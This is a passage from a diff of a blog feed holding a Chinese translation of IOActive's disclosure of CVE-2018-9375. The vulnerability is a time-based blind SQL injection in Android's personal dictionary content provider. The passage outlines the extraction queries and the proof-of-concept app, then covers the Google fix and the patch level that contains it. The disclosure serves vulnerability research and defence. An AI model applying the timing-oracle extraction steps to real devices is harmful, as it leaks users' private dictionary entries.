+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>如果条件为真，那么带有标识符“N”的行会将以一种不会改变其标识符的方式进行更新，因为它将被设置为其原始值，而行则保持不变。这是一种非侵入性的方法，使用执行时间作为侧通道oracle来提取数据。&lt;/p>
+&lt;p>因为我们可以用任何子SELECT语句替换上面的条件，所以这种攻击可以扩展到查询SQLite中支持的任何SQL表达式，例如：&lt;/p>
+&lt;ul>
+&lt;li>&amp;lsquo;something&amp;rsquo;这个词存储在字典里吗？&lt;/li>
+&lt;li>检索所有16个字符的单词（如信用卡号）&lt;/li>
+&lt;li>检索所有有快捷方式的单词&lt;/li>
+&lt;li>检索包含一个点的所有单词&lt;/li>
+&lt;/ul>
+&lt;h3 id="真实的利用">真实的利用&lt;/h3>
+&lt;p>上面描述的过程可以完全自动化和优化。我开发了一个简单的Android应用程序来证明它的可利用性并测试它的有效性。&lt;/p>
+&lt;p>PoC应用程序基于这样的假设：我们可以通过上述的内容提供者盲目地更新&lt;code>UserDictionary &lt;/code>数据库中的任意行。 如果内部更新语句影响一或多行，则需要更多的时间来执行。 这基本上是我们所需要的，以便推断以SQL条件形式的假设是否被评估为true或false。&lt;/p>
+&lt;p>但是，由于在这个初始阶段，我们没有任何关于内容的信息(甚至没有内部标识符的值)，而不是遍历所有可能的标识符值，我们将从具有最低标识符的行开始， 并将其“frequency”字段的原始值粉碎为任意数字。这个步骤可以使用不同的有效方法来完成。&lt;/p>
+&lt;p>由于多个共享进程将同时在Android上运行，因此相同调用的总运行时间会因不同的执行而有所不同。此外，执行时间还决于每个设备的处理能力和性能。然而，从统计的角度来看，重复相同的调用，大量的迭代应该给我们一个平均的可微度量。 这就是为什么我们需要调整每个设备和当前配置的迭代次数（例如，在省电模式下）。&lt;/p>
+&lt;p>尽管我尝试了一种更复杂的方法来确定响应时间是否应该被解释成真或假，但我最终实现了一种更简单的方法，从而获得了准确和可靠的结果。 只要计算相同数量的总是为“true”请求（e.g. “&lt;code>WHERE 1=1&lt;/code>”) 和总是为”false&amp;quot;的请求(e.g. “&lt;code>WHERE 1=0&lt;/code>”) ，并以平均时间作为临界值来区分它们。比临界值更大的测量时间将被解释为真; 反之为假。这不是人工智能或大数据，也不是使用区块链或云计算，而是 K.I.S.S. 原理适用并有效！&lt;/p>
+&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180805212145.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>一旦我们有了区分正确和错误假设的方法，那么转储整个数据库就变得轻而易举了。前一节中描述的示例很容易理解，但它并不是最有效的提取信息的方法。 在我们的PoC中，我们将使用二分查找算法[4]来代替任何数字查询，使用以下简单的方法：&lt;/p>
+&lt;ul>
+&lt;li>确定表的行数（可选）
+&lt;ul>
+&lt;li>&lt;code>SELECT COUNT(*) FROM words&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>确定最低的标识符
+&lt;ul>
+&lt;li>&lt;code>SELECT MIN(_id) FROM words&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>使用该标识符确定单词的字符数。
+&lt;ul>
+&lt;li>&lt;code>SELECT length(word) FROM words WHERE _id=N&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>遍历该单词，通过字符提取字符（在字符/unicode中）
+&lt;ul>
+&lt;li>&lt;code>SELECT unicode(substr(word, i, 1)) FROM words WHERE _id=N&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>确定比我们得到的标识符大的最低标识符，并重复&lt;/li>
+&lt;li>&lt;code>SELECT MIN(_id) FROM words WHERE _id &amp;gt; N&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>请记住，我们不能直接检索任何数字或字符串值，因此我们需要将这些表达式转换为一组布尔查询，这些查询可以根据它们的执行时间计算为true或false。这就是二分查找算法的工作原理。我们不会直接查询一个数字，而是反复查询：它是否大于X？”，在每次迭代中调整X的值，直到在log(n)查询后找到正确的值为止。例如，如果检索的当前值是97，那么该算法的执行跟踪将如下所示：&lt;/p>
+&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180805212208.png"
+loading="lazy"
+>&lt;/p>
+&lt;h3 id="poc利用工具">PoC利用工具&lt;/h3>
+&lt;p>上面描述的过程是在PoC工具中实现的，如下所示 。这个PoC的源代码和编译的APK可以从下面的GitHub存储库找到： &lt;a class="link" href="https://github.com/IOActive/AOSP-ExploitUserDictionary" target="_blank" rel="noopener"
+>https://github.com/IOActive/AOSP-ExploitUserDictionary&lt;/a>&lt;/p>
+&lt;p>让我们看看它的极简用户界面，并解释它的特性。&lt;/p>
+&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180805212218.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>应用程序做的第一件事是尝试直接访问个人字典内容提供者，查询条目的数量。在正常情况下（不是作为root运行，等等），我们不应该有访问权限。 如果出于任何原因我们实现了直接访问，使用基于时间的盲注方法来利用任何东西是没有意义的，但是即使在这种情况下，我们也欢迎您将CPU运行浪费在这个PoC上，而不是挖掘加密货币。&lt;/p>
+&lt;p>如前所述，只有两个参数需要调整：&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Initial number of iterations&lt;/strong> （初始迭代次数）：有多少次相同的调用会被重复以获得显著的时间差。&lt;/li>
+&lt;li>&lt;strong>Minimum time threshold&lt;/strong> （最短时间临界值，以毫秒为单位）：多少时间将被视为可接受的最低值。&lt;/li>
+&lt;/ul>
+&lt;p>虽然该工具的当前版本将自动调整它们，但在第一阶段，一切都是手动的，工具只是提供这些参数，因此这就是存在这些控制的原因之一。&lt;/p>
+&lt;p>从理论上讲，这些数字越大，我们得到的精确度就越高，但提取的速度会更慢。如果它们更小，它将运行得更快，但它更有可能获得不准确的结果。这就是为什么存在最少10次迭代和200毫秒的硬编码。&lt;/p>
+&lt;p>如果我们按下“开始”按钮，应用程序将启动参数的自动调整。首先，它将运行一些查询并丢弃结果，因为最初的查询通常比较高且不具有代表性。然后，它将执行初始的迭代次数并估计相应的临界值。如果获得的临界值超过了我们配置的最小值，那么它将运行20个连续的查询，交替执行true和false语句来测试估计的准确性。 如果准确度较差（只允许一个错误），然后，它将增加迭代次数，并按设定的次数重复处理，直到参数被适当调整，或者在条件不能满足时放弃和退出。&lt;/p>
+&lt;p>一旦进程启动，一些控件将被禁用，我们将在下面的可滚动日志窗口(也通过logcat)中看到当前详细的输出，在其中我们可以看到当前行标识符、所有SQL子查询、总时间和推断的真实性。检索到的字符将在提取后立即出现在上面一行中。&lt;/p>
+&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180805212230.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>最后，右边的“UPD&amp;quot;和DEL&amp;quot;按钮与基于时间的提取控件完全无关，他们只是简单地实现对内容提供者的直接调用，分别执行更新和删除操作。它们被有意地限制在只以“123”开头的单词。这样做是为了避免任何个人字典的意外删除，因此为了测试这些方法，我们需要手动添加这个条目，除非我们已经有了。&lt;/p>
+&lt;h3 id="demo">Demo&lt;/h3>
+&lt;p>总结这个过程的最简单的方法可能是在下面的视频中观看工具的动作，记录在一个真正的设备中。(可能无法观看)&lt;/p>
+&lt;p>&lt;a class="link" href="http://www.youtube.com/watch?v=8i-oMcaJw40" target="_blank" rel="noopener"
+>&lt;img src="http://img.youtube.com/vi/8i-oMcaJw40/0.jpg"
+loading="lazy"
+alt="IMAGE ALT TEXT HERE"
+>&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="http://www.youtube.com/watch?v=VQf-INNTKKU" target="_blank" rel="noopener"
+>&lt;img src="http://img.youtube.com/vi/VQf-INNTKKU/0.jpg"
+loading="lazy"
+alt="IMAGE ALT TEXT HERE"
+>&lt;/a>&lt;/p>
+&lt;h3 id="额外的注意事项">额外的注意事项&lt;/h3>
+&lt;p>理论和实践之间通常存在差距，所以我也想在这个PoC的设计和开发过程中分享我遇到的一些问题。 首先，请记住，该工具只是一个快速和肮脏的PoC。 它的主要目标是证明利用是可行的，并且可以直接实现，这就是为什么它有一些限制并且不遵循推荐的编程最佳实践，因为它不意味着可维护，高效，提供良好的用户体验，等等。&lt;/p>
+&lt;p>在初始阶段，我并不关心UI，一切消息都被转储到Android日志输出中。当我决定在GUI中显示结果时，我不得不在一个单独的线程中运行所有的代码，以避免阻塞UI线程 (这可能会导致应用程序被认为是无响应的因此被操作系统杀死）。由于这个简单的更改，精确度大大下降，因为线程没有太高的优先级，所以我将其设置为“-20”，这是允许的最大优先级，之后一切都恢复正常工作了。&lt;/p>
+&lt;p>从一个单独的线程更新UI可能会导致崩溃，通常会通过运行时异常来检测和限制，因此为了显示日志消息，我不得不使用对 &lt;code>runOnUiThread&lt;/code> 的调用来调用它们。请记住，在实际的利用中，根本不需要UI。&lt;/p>
+&lt;p>如果个人字典为空，则不能使用任何行去强制更新，因此所有查询的执行时间大致相同。在这种情况下，将没有任何东西可以提取，工具也不会调整参数，最终会停止运行。在一些奇怪的情况下，它可能会被随机地校准，即使是空的数据库，它也会尝试提取垃圾或伪随机数据。&lt;/p>
+&lt;p>在常规的智能手机中，操作系统会在一段时间后进入睡眠模式，性能会大幅下降，导致执行时间超过预期值，因此所有的调用都将被评估为true。这可以被检测到并以不同的方式做出反应，但我只是选择了一个更简单的解决方案：我一直打开屏幕，并通过电源管理器获得一个唤醒锁，以防止操作系统挂起应用程序。 之后我没有费心去释放它，所以如果您不使用，您必须得关闭应用程序。&lt;/p>
+&lt;p>旋转屏幕也会引起问题，因此，我将它强制设置为横向模式，以避免自动旋转，并利用额外的宽度来显示每条消息。&lt;/p>
+&lt;p>一旦你按下“开始”按钮，一些控件将被永久禁用。如果您想要重新调整参数或多次运行它，您需要关闭它并重新打开它。&lt;/p>
+&lt;p>一些外部事件和并行执行（例如同步电子邮件或接收推送消息) 可能会干扰应用程序的行为，可能会导致不准确的结果。如果发生这种情况，请在更稳定的条件下再试一次，比如禁用对网络的访问或关闭所有其他应用程序。&lt;/p>
+&lt;p>UI不支持国际化，它不是为了在Unicode中提取单词而设计的（尽管它应该是微不足道的，但它并不是我的目标，这只是简单的一个PoC）。&lt;/p>
+&lt;p>它被有意地限制为只提取前5个单词，并根据它们的内部标识进行排序。&lt;/p>
+&lt;h3 id="修复">修复&lt;/h3>
+&lt;p>从源代码的角度来看，修复非常简单。只要移动调用来检查调用者是否拥有受影响函数开始的权限，就足以解决这个问题。除了这个建议之外，我们还向Google提供了一个补丁文件，其中包含了建议的修复程序，这是他们修复漏洞的公告：&lt;/p>
+&lt;p>&lt;a class="link" href="https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/&amp;#43;/cccf7d5c98fc81ff4483f921fb4ebfa974add9c6" target="_blank" rel="noopener"
+>https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/cccf7d5c98fc81ff4483f921fb4ebfa974add9c6&lt;/a>&lt;/p>
+&lt;p>由于这个问题已经在官方存储库中被修复了，作为用户，我们必须确保我们当前安装的安全补丁级别包含CVE-2018-9375的补丁。例如，在Google pixel/nexus中，它于2018年6月发布：&lt;/p>
+&lt;p>&lt;a class="link" href="https://source.android.com/security/bulletin/pixel/2018-06-01" target="_blank" rel="noopener"
+>https://source.android.com/security/bulletin/pixel/2018-06-01&lt;/a>&lt;/p>
+&lt;p>如果由于任何原因，不能对您的设备进行更新，考虑检查您的个人字典的内容，并确保它不包含任何敏感信息，在不太可能的事件中，这个问题将被积极地利用。&lt;/p>
+&lt;h3 id="总结">总结&lt;/h3>
+&lt;p>软件开发是困难的。一个错误的行可能导致不良的结果。一项旨在提高用户个人词典的安全性和保护的改变导致了相反的结果，因为它无意中允许访问，而不需要任何特定的许可，并且在近3年的时间里没有被注意到。&lt;/p>
+&lt;p>识别像这里描述的那样的漏洞可以像阅读和理解源代码一样简单，只需遵循执行流程即可。自动化测试可能有助于在早期发现这类问题，并防止它们在进一步的更改中再次发生，但是它们并不总是那么容易实现和维护。&lt;/p>
+&lt;p>我们还学会了如何从一个漏洞中得到最大的好处，这个漏洞原则上只允许我们盲目地破坏或篡改数据，从而增加了它对信息披露的最终影响，而信息泄露是利用一个侧信道、基于时间的攻击来泄露所有数据。&lt;/p>
+&lt;p>要学会跳出固有思维去思考一件事，记住：时间是最有价值的资源之一。每秒都值千金!&lt;/p>
+&lt;p>[1] &lt;a class="link" href="https://developer.android.com/reference/android/provider/UserDictionary" target="_blank" rel="noopener"
+>https://developer.android.com/reference/android/provider/UserDictionary&lt;/a>
+[2] Gerrit’s Change-Id: I6c5716d4d6ea9d5f55a71b6268d34f4faa3ac043
+&lt;a class="link" href="https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/&amp;#43;/e0e0e0c9b27e10f7e33c371c490fdae8b634f117" target="_blank" rel="noopener"
+>https://android.googlesource.com/platform/packages/providers/…&lt;/a>
+[3]At the time of discovery, it was found in the AOSP master branch:
+&lt;a class="link" href="https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/&amp;#43;/master/src/com/android/providers/userdictionary/UserDictionaryProvider.java" target="_blank" rel="noopener"
+>https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/…&lt;/a>
+After the fix, the equivalent contents can be found in the following commit:
+&lt;a class="link" href="https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/&amp;#43;/0272515f306cf7f12d2babe03d625850990a00c1/src/com/android/providers/userdictionary/UserDictionaryProvider.java" target="_blank" rel="noopener"
+>https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/…&lt;/a>
+[4 ]&lt;a class="link" href="https://en.wikipedia.org/wiki/Binary_search_algorithm" target="_blank" rel="noopener"
+>https://en.wikipedia.org/wiki/Binary_search_algorithm&lt;/a>&lt;/p>
+&lt;blockquote>
+&lt;p>[原文：&lt;a class="link" href="https://ioactive.com/discovering-and-exploiting-a-vulnerability-in-androids-personal-dictionary/" target="_blank" rel="noopener"
+>Discovering and Exploiting a Vulnerability in Android’s Personal Dictionary (CVE-2018-9375)&lt;/a>&lt;/p>
+&lt;/blockquote></description></item></channel></rss>
